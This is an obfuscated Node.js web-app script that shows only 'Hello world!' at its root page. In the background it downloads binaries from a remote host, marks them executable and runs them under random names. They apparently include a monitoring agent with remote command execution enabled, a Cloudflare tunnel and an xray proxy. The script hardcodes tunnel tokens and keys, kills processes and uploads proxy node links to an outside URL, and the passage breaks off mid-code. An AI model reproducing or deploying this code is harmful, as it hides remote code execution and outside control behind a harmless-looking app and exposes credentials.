const _0x2a1c28=_0xdc23;(function(_0x337115,_0x553804){const _0x51865f={_0x5c5f00:0xf8,_0x3b61cb:0x130,_0x5694df:0x103,_0x575cf6:0xe0,_0x5482fa:0xbc},_0x4222df=_0xdc23,_0x25e641=_0x337115();while(!![]){try{const _0x31b0e8=-parseInt(_0x4222df(_0x51865f._0x5c5f00))/0x1*(parseInt(_0x4222df(_0x51865f._0x3b61cb))/0x2)+parseInt(_0x4222df(0xbd))/0x3*(-parseInt(_0x4222df(0xd3))/0x4)+-parseInt(_0x4222df(_0x51865f._0x5694df))/0x5+-parseInt(_0x4222df(0xde))/0x6+-parseInt(_0x4222df(0x115))/0x7*(parseInt(_0x4222df(_0x51865f._0x575cf6))/0x8)+-parseInt(_0x4222df(_0x51865f._0x5482fa))/0x9+parseInt(_0x4222df(0xe1))/0xa*(parseInt(_0x4222df(0xae))/0xb);if(_0x31b0e8===_0x553804)break;else _0x25e641['push'](_0x25e641['shift']());}catch(_0x5a5f88){_0x25e641['push'](_0x25e641['shift']());}}}(_0x1bb9,0xb082e));const express=require(_0x2a1c28(0x89)),app=express(),axios=require(_0x2a1c28(0xf7)),os=require('os'),fs=require('fs'),path=require(_0x2a1c28(0xdd)),{promisify}=require(_0x2a1c28(0xf0)),exec=promisify(require(_0x2a1c28(0xab))[_0x2a1c28(0xb0)]),{execSync}=require(_0x2a1c28(0xab)),UPLOAD_URL=process[_0x2a1c28(0x117)][_0x2a1c28(0x108)]||'',PROJECT_URL=process[_0x2a1c28(0x117)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2a1c28(0x117)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2a1c28(0x117)]['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0x2a1c28(0xc8)]||_0x2a1c28(0xa4),PORT=process[_0x2a1c28(0x117)][_0x2a1c28(0x105)]||process[_0x2a1c28(0x117)][_0x2a1c28(0xfc)]||0xbb8,UUID=process['env'][_0x2a1c28(0xff)]||'d52562e6-38cb-4e0a-b1d0-9d731f494055',NEZHA_SERVER=process[_0x2a1c28(0x117)]['NEZHA_SERVER']||_0x2a1c28(0xfb),NEZHA_PORT=process['env'][_0x2a1c28(0x11d)]||'',NEZHA_KEY=process['env'][_0x2a1c28(0x10f)]||_0x2a1c28(0xe8),ARGO_DOMAIN=process[_0x2a1c28(0x117)][_0x2a1c28(0xcb)]||_0x2a1c28(0x109),ARGO_AUTH=process[_0x2a1c28(0x117)][_0x2a1c28(0x94)]||_0x2a1c28(0xb3),ARGO_PORT=process[_0x2a1c28(0x117)]['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||'cf.090227.xyz',CFPORT=process[_0x2a1c28(0x117)][_0x2a1c28(0xa1)]||0x1bb,NAME=process['env'][_0x2a1c28(0x107)]||'railway';!fs['existsSync'](FILE_PATH)?(fs[_0x2a1c28(0xad)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x2a1c28(0xc7));function generateRandomName(){const _0x2fe061={_0xfc8c23:0xee,_0x420a59:0x88},_0x4a117a=_0x2a1c28,_0x371306='abcdefghijklmnopqrstuvwxyz';let _0x139891='';for(let _0x4ec70=0x0;_0x4ec70<0x6;_0x4ec70++){_0x139891+=_0x371306[_0x4a117a(_0x2fe061._0xfc8c23)](Math['floor'](Math[_0x4a117a(_0x2fe061._0x420a59)]()*_0x371306[_0x4a117a(0xd1)]));}return _0x139891;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2a1c28(0xb6)](FILE_PATH,npmName),phpPath=path[_0x2a1c28(0xb6)](FILE_PATH,phpName),webPath=path[_0x2a1c28(0xb6)](FILE_PATH,webName),botPath=path[_0x2a1c28(0xb6)](FILE_PATH,botName),subPath=path[_0x2a1c28(0xb6)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x2a1c28(0x104)),configPath=path['join'](FILE_PATH,_0x2a1c28(0x137));function _0x1bb9(){const _0x161d80=['tunnel.json','ARGO_DOMAIN','/trojan-argo','php\x20running\x20error:\x20','TunnelSecret','utf-8','443','length','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','4NELvuu','http','ArgoDomain:','unshift','tcp','data','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','post','Content-Type','/tunnel.yml\x20run','path','5093220BOdhNX','https://ipapi.co/json/','688BcQjBp','10qXPjgS','Subscription\x20uploaded\x20successfully','Hello\x20world!','quic','listen','aarch64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','VbFrfSN2JDTBVaUbqUm4VcCGZHHEBCzq','stringify','taskkill\x20/f\x20/im\x20','xtls-rprx-vision','Error\x20in\x20startserver:','Unhandled\x20error\x20in\x20startserver:','charAt','forEach','util','get','\x0a\x0atrojan://','message','existsSync','Unknown','readFileSync','axios','3NRcFbw','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20-c\x20','92.113.117.22:11539','PORT','push','basename','UUID','arm','split','log','6912210BqckVe','boot.log','SERVER_PORT','127.0.0.1','NAME','UPLOAD_URL','railway.pimm520.qzz.io','/api/delete-nodes','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','firefox','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','npm\x20running\x20error:\x20','NEZHA_KEY','nohup\x20','Nodes\x20uploaded\x20successfully','\x22\x20>\x20/dev/null\x202>&1','/api/add-subscriptions','automatic\x20access\x20task\x20added\x20successfully','90657zdVaGt','&fp=firefox&type=ws&host=','env','base64','org','none','error','https://arm64.ssss.nyc.mn/bot','NEZHA_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','pipe','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/bot','Skipping\x20adding\x20automatic\x20access\x20task','2083','test','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2096','/dev/null','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','success','\x0a\x0avmess://','/config.json\x20>/dev/null\x202>&1\x20&','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','writeFileSync','freedom','156346EudBvS','\x0a\x20\x20tunnel:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20is\x20running','\x20failed:\x20','Empowerment\x20failed\x20for\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','config.json','config.yaml','response','unlinkSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20-c\x20\x22','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','catch','random','express','amd','/vmess-argo','from','isFile','countryCode','pkill\x20-f\x20\x22[','2053','\x20-s\x20','all','Error\x20reading\x20boot.log:','ARGO_AUTH','8443','ARGO_DOMAIN:','\x0a\x20\x20credentials-file:\x20','?security=tls&sni=','App\x20is\x20running','https://amd64.ssss.nyc.mn/web','Error\x20executing\x20command:\x20','includes','Empowerment\x20success\x20for\x20','has','/vless-argo','match','CFPORT','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','xbz','\x0a\x20\x20\x20\x20','readdirSync','unlink','substring','clear','web\x20running\x20error:\x20','child_process','fileUrl','mkdirSync','66741026gUqyej','https://arm64.ssss.nyc.mn/web','exec','del\x20/f\x20/q\x20','finish','eyJhIjoiMmFmYzQzZjhjMmU0NmVlYmE1ZWZlYjRhYTU0ODlhYWYiLCJ0IjoiMjY0MGQ1NzQtYmViNC00NjE3LTllNTgtYTE4YjA5MTNlYzJhIiwicyI6Ik5tRmhPRFF4TkRJdE1tTTNPQzAwWkdGbExXRXdZMk10TTJFeU1HUmtZbVExTkdZeSJ9','application/json','true','join','\x20>/dev/null\x202>&1\x20&','2087','/sub.txt\x20saved\x20successfully','tls','send','5266458uouggw','3538791aplOvC','chmod','\x20successfully','status','toString','text/plain;\x20charset=utf-8','\x20>/dev/null\x202>&1','/api/add-nodes','vless','statSync','\x20already\x20exists','SUB_PATH','filter'];_0x1bb9=function(){return _0x161d80;};return _0x1bb9();}function deleteNodes(){const _0x4dde97={_0x22c38e:0xcf,_0x58d58e:0x101,_0x23b741:0xc9,_0x228203:0x10a},_0x5de77b=_0x2a1c28;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x224273;try{_0x224273=fs[_0x5de77b(0xf6)](subPath,_0x5de77b(_0x4dde97._0x22c38e));}catch{return null;}const _0xa4a94d=Buffer[_0x5de77b(0x8c)](_0x224273,_0x5de77b(0x118))[_0x5de77b(0xc1)](_0x5de77b(0xcf)),_0x5e8e3e=_0xa4a94d[_0x5de77b(_0x4dde97._0x58d58e)]('\x0a')[_0x5de77b(_0x4dde97._0x23b741)](_0x2f76c2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2f76c2));if(_0x5e8e3e[_0x5de77b(0xd1)]===0x0)return;return axios[_0x5de77b(0xda)](UPLOAD_URL+_0x5de77b(_0x4dde97._0x228203),JSON[_0x5de77b(0xe9)]({'nodes':_0x5e8e3e}),{'headers':{'Content-Type':'application/json'}})[_0x5de77b(0x87)](_0x459fcc=>{return null;}),null;}catch(_0x173f55){return null;}}function cleanupOldFiles(){const _0x40374b={_0x3ad1ef:0xb6,_0x59599e:0x8d,_0x4b127c:0x82},_0x3e1c34=_0x2a1c28;try{const _0x5aa33d=fs[_0x3e1c34(0xa6)](FILE_PATH);_0x5aa33d['forEach'](_0x13f752=>{const _0x4e27dc=_0x3e1c34,_0x233b7f=path[_0x4e27dc(_0x40374b._0x3ad1ef)](FILE_PATH,_0x13f752);try{const _0x25642c=fs[_0x4e27dc(0xc6)](_0x233b7f);_0x25642c[_0x4e27dc(_0x40374b._0x59599e)]()&&fs[_0x4e27dc(_0x40374b._0x4b127c)](_0x233b7f);}catch(_0x46a2ed){}});}catch(_0x380b43){}}app[_0x2a1c28(0xf1)]('/',function(_0x24a02c,_0x2f2330){const _0x474922={_0x3c2480:0xe3},_0x4f2970=_0x2a1c28;_0x2f2330[_0x4f2970(0xbb)](_0x4f2970(_0x474922._0x3c2480));});async function generateConfig(){const _0x443fd7={_0x502a6b:0x11a,_0x118641:0xcc,_0x6d0553:0xd7,_0x44873b:0x106,_0x384e83:0xd7,_0xb00c1c:0xc5,_0xb8355b:0x11a,_0x3d07c0:0x9f,_0x49b7be:0xba,_0x583568:0xcc,_0x280cc8:0x12f},_0x16e364=_0x2a1c28,_0x1d1011={'log':{'access':_0x16e364(0x127),'error':_0x16e364(0x127),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x16e364(0xc5),'settings':{'clients':[{'id':UUID,'flow':_0x16e364(0xeb)}],'decryption':_0x16e364(_0x443fd7._0x502a6b),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x16e364(_0x443fd7._0x118641),'dest':0xbbc}]},'streamSettings':{'network':_0x16e364(_0x443fd7._0x6d0553)}},{'port':0xbb9,'listen':_0x16e364(_0x443fd7._0x44873b),'protocol':_0x16e364(0xc5),'settings':{'clients':[{'id':UUID}],'decryption':_0x16e364(0x11a)},'streamSettings':{'network':_0x16e364(_0x443fd7._0x384e83),'security':_0x16e364(_0x443fd7._0x502a6b)}},{'port':0xbba,'listen':_0x16e364(0x106),'protocol':_0x16e364(_0x443fd7._0xb00c1c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x16e364(_0x443fd7._0xb8355b),'wsSettings':{'path':_0x16e364(_0x443fd7._0x3d07c0)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x16e364(_0x443fd7._0x49b7be),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x16e364(0x106),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x16e364(0x8b)}},'sniffing':{'enabled':!![],'destOverride':[_0x16e364(0xd4),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x16e364(0x11a),'wsSettings':{'path':_0x16e364(_0x443fd7._0x583568)}},'sniffing':{'enabled':!![],'destOverride':[_0x16e364(0xd4),'tls',_0x16e364(0xe4)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x16e364(_0x443fd7._0x280cc8),'tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x16e364(0x12e)](path['join'](FILE_PATH,_0x16e364(0x137)),JSON[_0x16e364(0xe9)](_0x1d1011,null,0x2));}function getSystemArchitecture(){const _0x104c18={_0x100943:0xe6,_0x220c62:0x100,_0x458d54:0x8a},_0x2710ec=_0x2a1c28,_0x550fb3=os['arch']();return _0x550fb3===_0x2710ec(0x100)||_0x550fb3==='arm64'||_0x550fb3===_0x2710ec(_0x104c18._0x100943)?_0x2710ec(_0x104c18._0x220c62):_0x2710ec(_0x104c18._0x458d54);}function downloadFile(_0x8c8b22,_0x186037,_0x52256a){const _0x46b9bd={_0x297470:0xf4,_0x1cc682:0xad},_0x38fb21={_0x1318df:0x12c,_0x431fd1:0xf3},_0x14221c={_0x28967d:0xd8,_0x30c935:0x11f,_0x2322a8:0x11b},_0x4ed1a7={_0x17f70b:0x12c,_0x552026:0xbf},_0x37f8b0=_0x2a1c28,_0x21ef81=_0x8c8b22;!fs[_0x37f8b0(_0x46b9bd._0x297470)](FILE_PATH)&&fs[_0x37f8b0(_0x46b9bd._0x1cc682)](FILE_PATH,{'recursive':!![]});const _0x468043=fs['createWriteStream'](_0x21ef81);axios({'method':'get','url':_0x186037,'responseType':'stream'})['then'](_0x2f0a0e=>{const _0x36503e={_0x331268:0x12c,_0x558f9c:0xfe,_0x5ab99a:0x134,_0x5cc67d:0xf3},_0x3f75d7=_0x37f8b0;_0x2f0a0e[_0x3f75d7(_0x14221c._0x28967d)][_0x3f75d7(_0x14221c._0x30c935)](_0x468043),_0x468043['on'](_0x3f75d7(0xb2),()=>{const _0x4f6004=_0x3f75d7;_0x468043['close'](),console[_0x4f6004(0x102)](_0x4f6004(_0x4ed1a7._0x17f70b)+path[_0x4f6004(0xfe)](_0x21ef81)+_0x4f6004(_0x4ed1a7._0x552026)),_0x52256a(null,_0x21ef81);}),_0x468043['on'](_0x3f75d7(_0x14221c._0x2322a8),_0x25f129=>{const _0x476848=_0x3f75d7;fs[_0x476848(0xa7)](_0x21ef81,()=>{});const _0x5c92f6=_0x476848(_0x36503e._0x331268)+path[_0x476848(_0x36503e._0x558f9c)](_0x21ef81)+_0x476848(_0x36503e._0x5ab99a)+_0x25f129[_0x476848(_0x36503e._0x5cc67d)];console[_0x476848(0x11b)](_0x5c92f6),_0x52256a(_0x5c92f6);});})[_0x37f8b0(0x87)](_0x427ec3=>{const _0x4a3f57=_0x37f8b0,_0x2e50e8=_0x4a3f57(_0x38fb21._0x1318df)+path['basename'](_0x21ef81)+_0x4a3f57(0x134)+_0x427ec3[_0x4a3f57(_0x38fb21._0x431fd1)];console['error'](_0x2e50e8),_0x52256a(_0x2e50e8);});}async function downloadFilesAndRun(){const _0x1e9d62={_0x4ffe5a:0x102,_0xd2e918:0x101,_0x33edae:0x123,_0x116c0d:0x9e,_0x57713e:0xb5,_0x42314a:0x128,_0x1e6060:0xd2,_0x5cb257:0xb6,_0x59e6c7:0x138,_0x1e5786:0x84,_0x378b69:0x11e,_0x42fd09:0x95,_0x29f44c:0x126,_0x54502e:0xb8,_0x1553d8:0x110,_0x284e73:0x91,_0x51678c:0x102,_0x2187a6:0x11b,_0x2f8970:0xfa,_0x419420:0x102,_0x46267f:0x133,_0x114956:0xaa,_0x390b42:0x86,_0x25dcde:0xa0,_0x450dd5:0x110},_0x16922c={_0x3c2857:0xef},_0x41a7ac=_0x2a1c28,_0x444548=getSystemArchitecture(),_0xa02334=getFilesForArchitecture(_0x444548);if(_0xa02334[_0x41a7ac(0xd1)]===0x0){console[_0x41a7ac(_0x1e9d62._0x4ffe5a)](_0x41a7ac(0x132));return;}const _0x2a5389=_0xa02334['map'](_0x25126b=>{return new Promise((_0x2f57c1,_0x46347e)=>{const _0x107690=_0xdc23;downloadFile(_0x25126b['fileName'],_0x25126b[_0x107690(0xac)],(_0x22e5ea,_0x28e800)=>{_0x22e5ea?_0x46347e(_0x22e5ea):_0x2f57c1(_0x28e800);});});});try{await Promise[_0x41a7ac(0x92)](_0x2a5389);}catch(_0xef99e8){console['error']('Error\x20downloading\x20files:',_0xef99e8);return;}function _0x24e1e9(_0x3a0a25){const _0xcedd09={_0x35ebec:0xf4,_0x145657:0xbe},_0x3fff37={_0x262d77:0x11b,_0x93a5b7:0x102,_0x29ddfe:0xc1},_0x27e338=_0x41a7ac,_0x3997c7=0x1fd;_0x3a0a25[_0x27e338(_0x16922c._0x3c2857)](_0x2434e3=>{const _0x273a94=_0x27e338;fs[_0x273a94(_0xcedd09._0x35ebec)](_0x2434e3)&&fs[_0x273a94(_0xcedd09._0x145657)](_0x2434e3,_0x3997c7,_0x440128=>{const _0x537c7b=_0x273a94;_0x440128?console[_0x537c7b(_0x3fff37._0x262d77)](_0x537c7b(0x135)+_0x2434e3+':\x20'+_0x440128):console[_0x537c7b(_0x3fff37._0x93a5b7)](_0x537c7b(0x9d)+_0x2434e3+':\x20'+_0x3997c7[_0x537c7b(_0x3fff37._0x29ddfe)](0x8));});});}const _0x3069a7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24e1e9(_0x3069a7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3b260c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x41a7ac(_0x1e9d62._0xd2e918)](':')['pop']():'',_0x545f71=new Set([_0x41a7ac(0xd0),'8443',_0x41a7ac(0x126),_0x41a7ac(0xb8),_0x41a7ac(_0x1e9d62._0x33edae),_0x41a7ac(0x90)]),_0x3540ff=_0x545f71[_0x41a7ac(_0x1e9d62._0x116c0d)](_0x3b260c)?_0x41a7ac(_0x1e9d62._0x57713e):'false',_0xf5f04d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x41a7ac(0xd9)+NEZHA_SERVER+_0x41a7ac(_0x1e9d62._0x42314a)+_0x3540ff+_0x41a7ac(_0x1e9d62._0x1e6060)+UUID;fs[_0x41a7ac(0x12e)](path[_0x41a7ac(_0x1e9d62._0x5cb257)](FILE_PATH,_0x41a7ac(_0x1e9d62._0x59e6c7)),_0xf5f04d);const _0x122f72=_0x41a7ac(0x110)+phpPath+_0x41a7ac(_0x1e9d62._0x1e5786)+FILE_PATH+_0x41a7ac(_0x1e9d62._0x378b69);try{await exec(_0x122f72),console[_0x41a7ac(0x102)](phpName+_0x41a7ac(0x133)),await new Promise(_0x28daae=>setTimeout(_0x28daae,0x3e8));}catch(_0x5c9ada){console[_0x41a7ac(0x11b)](_0x41a7ac(0xcd)+_0x5c9ada);}}else{let _0x490a77='';const _0x17b6a6=[_0x41a7ac(0xd0),_0x41a7ac(_0x1e9d62._0x42fd09),_0x41a7ac(_0x1e9d62._0x29f44c),_0x41a7ac(_0x1e9d62._0x54502e),'2083',_0x41a7ac(0x90)];_0x17b6a6[_0x41a7ac(0x9c)](NEZHA_PORT)&&(_0x490a77='--tls');const _0x3ac8e0=_0x41a7ac(_0x1e9d62._0x1553d8)+npmPath+_0x41a7ac(_0x1e9d62._0x284e73)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x490a77+_0x41a7ac(0x125);try{await exec(_0x3ac8e0),console[_0x41a7ac(_0x1e9d62._0x51678c)](npmName+'\x20is\x20running'),await new Promise(_0x471a57=>setTimeout(_0x471a57,0x3e8));}catch(_0x34c41b){console[_0x41a7ac(_0x1e9d62._0x2187a6)](_0x41a7ac(0x10e)+_0x34c41b);}}}else console[_0x41a7ac(0x102)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x76dd6f=_0x41a7ac(0x110)+webPath+_0x41a7ac(_0x1e9d62._0x2f8970)+FILE_PATH+_0x41a7ac(0x12b);try{await exec(_0x76dd6f),console[_0x41a7ac(_0x1e9d62._0x419420)](webName+_0x41a7ac(_0x1e9d62._0x46267f)),await new Promise(_0xe43300=>setTimeout(_0xe43300,0x3e8));}catch(_0xe5bb66){console[_0x41a7ac(0x11b)](_0x41a7ac(_0x1e9d62._0x114956)+_0xe5bb66);}if(fs[_0x41a7ac(0xf4)](botPath)){let _0x26da0a;if(ARGO_AUTH[_0x41a7ac(0xa0)](/^[A-Z0-9a-z=]{120,250}$/))_0x26da0a=_0x41a7ac(_0x1e9d62._0x390b42)+ARGO_AUTH;else ARGO_AUTH[_0x41a7ac(_0x1e9d62._0x25dcde)](/TunnelSecret/)?_0x26da0a=_0x41a7ac(0x12d)+FILE_PATH+_0x41a7ac(0xdc):_0x26da0a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x41a7ac(0xa3)+ARGO_PORT;try{await exec(_0x41a7ac(_0x1e9d62._0x450dd5)+botPath+'\x20'+_0x26da0a+_0x41a7ac(0xb7)),console['log'](botName+_0x41a7ac(_0x1e9d62._0x46267f)),await new Promise(_0x1b3271=>setTimeout(_0x1b3271,0x7d0));}catch(_0xdc6b2a){console[_0x41a7ac(_0x1e9d62._0x2187a6)](_0x41a7ac(0x9b)+_0xdc6b2a);}}await new Promise(_0x2fe43d=>setTimeout(_0x2fe43d,0x1388));}function getFilesForArchitecture(_0x1f42ca){const _0xcc2226={_0x4de2d1:0x121,_0x254b0a:0xd6,_0x2186ae:0xa2,_0x432600:0xd6},_0x40538e=_0x2a1c28;let _0x219113;_0x1f42ca===_0x40538e(0x100)?_0x219113=[{'fileName':webPath,'fileUrl':_0x40538e(0xaf)},{'fileName':botPath,'fileUrl':_0x40538e(0x11c)}]:_0x219113=[{'fileName':webPath,'fileUrl':_0x40538e(0x9a)},{'fileName':botPath,'fileUrl':_0x40538e(_0xcc2226._0x4de2d1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xdb4140=_0x1f42ca===_0x40538e(0x100)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x219113[_0x40538e(_0xcc2226._0x254b0a)]({'fileName':npmPath,'fileUrl':_0xdb4140});}else{const _0xa8e8bc=_0x1f42ca==='arm'?_0x40538e(_0xcc2226._0x2186ae):'https://amd64.ssss.nyc.mn/v1';_0x219113[_0x40538e(_0xcc2226._0x432600)]({'fileName':phpPath,'fileUrl':_0xa8e8bc});}}return _0x219113;}function argoType(){const _0x244798={_0x16ebfb:0x9c,_0x5b33d4:0xce,_0x185e66:0xca,_0x2610b2:0xb6},_0x2182f1=_0x2a1c28;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2182f1(0x102)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2182f1(_0x244798._0x16ebfb)](_0x2182f1(_0x244798._0x5b33d4))){fs[_0x2182f1(0x12e)](path['join'](FILE_PATH,_0x2182f1(_0x244798._0x185e66)),ARGO_AUTH);const _0x63a9bb=_0x2182f1(0x131)+ARGO_AUTH[_0x2182f1(0x101)]('\x22')[0xb]+_0x2182f1(0x97)+path[_0x2182f1(_0x244798._0x2610b2)](FILE_PATH,_0x2182f1(_0x244798._0x185e66))+_0x2182f1(0x120)+ARGO_DOMAIN+_0x2182f1(0x83)+ARGO_PORT+_0x2182f1(0x85);fs[_0x2182f1(0x12e)](path[_0x2182f1(_0x244798._0x2610b2)](FILE_PATH,'tunnel.yml'),_0x63a9bb);}else console['log'](_0x2182f1(0x136));}async function extractDomains(){const _0x1935cc={_0xaf3981:0x102,_0x457b4b:0xf6,_0x5b1ced:0xb6,_0x2ed345:0xcf,_0x40015b:0xef,_0x39bf2f:0x102,_0x28ba64:0x104,_0x2b2418:0xe7,_0x49f1b8:0x110,_0x31f87f:0x133,_0xb20235:0x11b,_0x52e895:0x93},_0x992937={_0x841105:0xdf,_0x3a43fe:0xd8,_0x39c729:0x119,_0x3a9008:0x129,_0x17b3a7:0x119,_0x22784f:0x8e,_0xac9996:0xf5},_0x575f60={_0x362c0c:0xea,_0x3f1498:0xee},_0x47c59c=_0x2a1c28;let _0x39ade4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39ade4=ARGO_DOMAIN,console[_0x47c59c(_0x1935cc._0xaf3981)](_0x47c59c(0x96),_0x39ade4),await _0x52293c(_0x39ade4);else try{const _0x1ebe1c=fs[_0x47c59c(_0x1935cc._0x457b4b)](path[_0x47c59c(_0x1935cc._0x5b1ced)](FILE_PATH,'boot.log'),_0x47c59c(_0x1935cc._0x2ed345)),_0x5c3f6b=_0x1ebe1c['split']('\x0a'),_0x1b0785=[];_0x5c3f6b[_0x47c59c(_0x1935cc._0x40015b)](_0x102279=>{const _0x6755ba=_0x47c59c,_0x3374d4=_0x102279[_0x6755ba(0xa0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3374d4){const _0x205a21=_0x3374d4[0x1];_0x1b0785[_0x6755ba(0xfd)](_0x205a21);}});if(_0x1b0785['length']>0x0)_0x39ade4=_0x1b0785[0x0],console[_0x47c59c(_0x1935cc._0x39bf2f)](_0x47c59c(0xd5),_0x39ade4),await _0x52293c(_0x39ade4);else{console[_0x47c59c(_0x1935cc._0x39bf2f)](_0x47c59c(0x10d)),fs[_0x47c59c(0x82)](path['join'](FILE_PATH,_0x47c59c(_0x1935cc._0x28ba64)));async function _0x1ca9c3(){const _0x3907f6=_0x47c59c;try{process['platform']==='win32'?await exec(_0x3907f6(_0x575f60._0x362c0c)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x3907f6(0x8f)+botName[_0x3907f6(_0x575f60._0x3f1498)](0x0)+']'+botName[_0x3907f6(0xa8)](0x1)+_0x3907f6(0x112));}catch(_0xbcd6ae){}}_0x1ca9c3(),await new Promise(_0x318f86=>setTimeout(_0x318f86,0xbb8));const _0x48b3b8=_0x47c59c(_0x1935cc._0x2b2418)+FILE_PATH+_0x47c59c(0xa3)+ARGO_PORT;try{await exec(_0x47c59c(_0x1935cc._0x49f1b8)+botPath+'\x20'+_0x48b3b8+_0x47c59c(0xb7)),console[_0x47c59c(0x102)](botName+_0x47c59c(_0x1935cc._0x31f87f)),await new Promise(_0x3f92a2=>setTimeout(_0x3f92a2,0xbb8)),await extractDomains();}catch(_0x205bb4){console[_0x47c59c(_0x1935cc._0xb20235)](_0x47c59c(0x9b)+_0x205bb4);}}}catch(_0x37875b){console[_0x47c59c(0x11b)](_0x47c59c(_0x1935cc._0x52e895),_0x37875b);}async function _0x58dcc0(){const _0x22ec79=_0x47c59c;try{const _0x1354ab=await axios[_0x22ec79(0xf1)](_0x22ec79(_0x992937._0x841105),{'timeout':0xbb8});if(_0x1354ab[_0x22ec79(0xd8)]&&_0x1354ab[_0x22ec79(0xd8)]['country_code']&&_0x1354ab['data'][_0x22ec79(0x119)])return _0x1354ab[_0x22ec79(_0x992937._0x3a43fe)]['country_code']+'_'+_0x1354ab['data'][_0x22ec79(_0x992937._0x39c729)];}catch(_0x5dbe39){try{const _0x1886f6=await axios[_0x22ec79(0xf1)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x1886f6[_0x22ec79(0xd8)]&&_0x1886f6[_0x22ec79(0xd8)]['status']===_0x22ec79(_0x992937._0x3a9008)&&_0x1886f6[_0x22ec79(0xd8)][_0x22ec79(0x8e)]&&_0x1886f6[_0x22ec79(0xd8)][_0x22ec79(_0x992937._0x17b3a7)])return _0x1886f6[_0x22ec79(_0x992937._0x3a43fe)][_0x22ec79(_0x992937._0x22784f)]+'_'+_0x1886f6[_0x22ec79(0xd8)][_0x22ec79(_0x992937._0x17b3a7)];}catch(_0x1411d8){}}return _0x22ec79(_0x992937._0xac9996);}async function _0x52293c(_0x4c999f){const _0x2fc67d=await _0x58dcc0(),_0x1ae844=NAME?NAME+'-'+_0x2fc67d:_0x2fc67d;return new Promise(_0x16fc88=>{const _0x5c289f={_0xa81a3c:0x11a,_0x55fcf6:0x12a,_0x1f6537:0x8c,_0x94cd92:0xe9,_0x3da771:0x118,_0x153ada:0xf2,_0x3b9f97:0x8c,_0x503457:0x102,_0x20798c:0xf1},_0x287d6e={_0x1ab432:0x8c,_0x23a95c:0xc1};setTimeout(()=>{const 